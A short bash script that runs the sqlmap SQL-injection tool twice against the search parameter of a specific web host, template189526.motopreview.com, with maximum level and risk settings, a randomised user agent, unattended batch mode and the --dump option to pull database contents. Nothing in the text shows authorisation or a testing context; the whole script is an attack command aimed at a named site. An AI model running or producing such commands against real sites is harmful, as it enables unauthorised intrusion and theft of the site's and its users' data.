#!/bin/bash

# Run the sqlmap command with options
sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1" --random-agent --level 5 --risk 3 --batch
sqlmap -u "https://template189526.motopreview.com/store/category/search/?keyword=1*" --random-agent --level 5 --risk 3 --batch --timeout=10 --drop-set-cookie -o --dump
